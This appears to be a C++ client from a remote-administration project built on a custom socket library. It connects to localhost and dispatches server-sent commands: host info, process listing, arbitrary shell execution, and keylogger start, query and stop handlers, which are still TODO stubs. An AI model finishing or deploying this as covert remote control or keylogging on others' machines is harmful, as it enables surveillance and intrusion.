#include <iostream>
#include <stdexcept>
#include <cstring>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "../include/LPTF_Net/LPTF_Socket.hpp"
#include "../include/LPTF_Net/LPTF_Utils.hpp"
#include "../include/commands.hpp"


class Client {
private:
    std::unique_ptr<LPTF_Socket> clientSocket;

public:
    Client(const std::string &serverIP, int port) {
        clientSocket = std::make_unique<LPTF_Socket>();

        struct sockaddr_in serverAddr;
        std::memset(&serverAddr, 0, sizeof(serverAddr));
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());
        serverAddr.sin_port = htons(port);

        clientSocket->connect(reinterpret_cast<struct sockaddr *>(&serverAddr), sizeof(serverAddr));
    }

    // executes the command in the COMMAND packet and build a REPLY packet from it if success else ERROR packet if the command could not be executed.
    LPTF_Packet execute_command(LPTF_Packet &cmd_pckt) {
        std::string cmd = get_command_from_command_packet(cmd_pckt);
        std::string out;
        try {
            if (strcmp(cmd.c_str(), HOST_INFO_COMMAND) == 0) {
                out = get_host_info();
            } else if (strcmp(cmd.c_str(), START_KEYLOG_COMMAND) == 0) {
                // TODO
                out = std::string("Started Keylog");
            } else if (strcmp(cmd.c_str(), QUERY_KEYLOG_COMMAND) == 0) {
                // TODO
                out = std::string("KEYLIST");
            } else if (strcmp(cmd.c_str(), STOP_KEYLOG_COMMAND) == 0) {
                // TODO
                out = std::string("KEYLIST");
            } else if (strcmp(cmd.c_str(), LIST_PROC_COMMAND) == 0) {
                out = get_running_processes();
            } else if (strcmp(cmd.c_str(), SHELL_COMMAND) == 0) {
                out = execute_shell_command(get_arg_from_command_packet(cmd_pckt));
            } else {
                // build ERROR packet
                return build_error_packet(cmd_pckt.type(), ERR_CMD_UNKNOWN, cmd);
            }
        } catch (const std::exception &ex) {
            // build ERROR packet
            std::string msg(ex.what());
            return build_error_packet(cmd_pckt.type(), ERR_CMD_FAILURE, msg);
        }

        return build_reply_packet(COMMAND_PACKET, (void*)out.c_str(), out.size()+1);
    }

    void listen_for_server() {
        LPTF_Packet msg = build_message_packet("ping");
        // msg.print_specs();  // debug
        // send message
        std::cout << "Sending ping message." << std::endl;
        ssize_t ret = clientSocket->write(msg);

        if (ret != -1) {
            // listen for server response
            LPTF_Packet resp = clientSocket->read();
            // resp.print_specs();  // debug

            std::cout << "Received: " << get_message_from_message_packet(resp) << std::endl;
        }
    }
};

int main() {
    try {
        Client client("127.0.0.1", 12345);
        client.listen_for_server();
    } catch (const std::exception &ex) {
        std::cerr << "Exception: " << ex.what() << std::endl;
        return 1;
    }

    return 0;
}
